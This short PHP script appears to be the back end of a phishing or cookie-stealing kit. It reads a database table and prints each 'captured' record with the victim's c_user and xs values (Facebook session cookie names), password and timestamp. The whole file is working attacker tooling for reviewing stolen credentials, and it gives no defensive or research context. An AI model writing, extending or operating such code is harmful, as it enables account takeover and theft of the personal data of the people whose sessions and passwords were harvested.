<?php

require __DIR__ . '/database.php';

  $sql =<<<EOF
      SELECT * from DATA;
EOF;

  $ret = pg_query($dbconn, $sql);
  if(!$ret) {
    echo pg_last_error($dbconn);
    exit;
  } 
  while($row = pg_fetch_row($ret)) {
    echo "*********Data Captured**********\n";
    echo "C_USER = ". $row[1] . "\n";
    echo "XS = ". $row[2] ."\n";
    echo "PASSWORD = ". $row[3] ."\n";
    echo "TIME =  ".$row[4] ."\n";
    echo "------------------------------\n";
    echo "\n\n";
  }
  pg_close($dbconn);